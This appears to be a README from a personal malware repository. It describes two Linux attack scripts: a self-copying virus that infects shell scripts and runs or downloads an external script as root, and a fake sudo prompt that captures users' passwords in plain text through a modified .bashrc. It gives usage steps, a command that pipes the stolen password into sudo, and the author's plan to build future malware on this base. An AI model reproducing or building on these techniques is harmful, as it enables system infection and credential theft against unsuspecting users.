# Scripts

## Linux Malware Installer
Description:
This script will list all the files in his directory and copy himself in the file with ".sh" extensions. After he do that, he will test if he have administrators right. If yes, he will execute or download an external script as root.

How to use:
Copy the script and edit him, replace `if [ $(id -u) = 0 ]; then : ; fi` by `if [ $(id -u) = 0 ]; then COMMAND ; fi`. Save the script on a computer, in a directory with at least 1 shell script, execute him and delete him.

Sign: iWiiLkd..NVF
Dangerosity : Low (can be detected easily by the antivirus and the virus must be executed by the user)

Note: He will be used as the main struct of my future malwares

## Linux Fake Login
Description:
This script will duplicate /bin/ in /tmp/bin/. He will replace `sudo` command by a fake payload. After, he modify .bashrc file and he close the terminal. When the user will start a new terminal and enter `sudo` he will have a fake authentication ask (realist) after he do that, his password will be stored in plain text in /tmp/bin/passw. You can add `cat /tmp/bin/passw | sudo -S COMMAND` to run what you in admin mode.

